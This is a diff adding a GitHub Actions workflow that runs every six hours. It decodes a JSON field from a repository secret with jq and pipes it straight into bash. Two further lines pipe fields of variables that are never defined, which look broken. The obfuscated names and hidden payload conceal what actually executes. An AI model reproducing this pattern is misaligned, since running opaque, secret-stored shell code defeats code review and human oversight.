@@ -1,0 +1,19 @@
+name: xiuqingcx
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '24 3/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: xiuqingcx
+        env:
+          o38: ${{ secrets.o38 }}
+        run: |
+          echo $o38 | jq -r .aabg38 | /bin/bash
+          echo $cytw36658 | jq -r .d86662 | /bin/bash
+          echo $sj982 | jq -r .ajryh8427 | /bin/bash
+
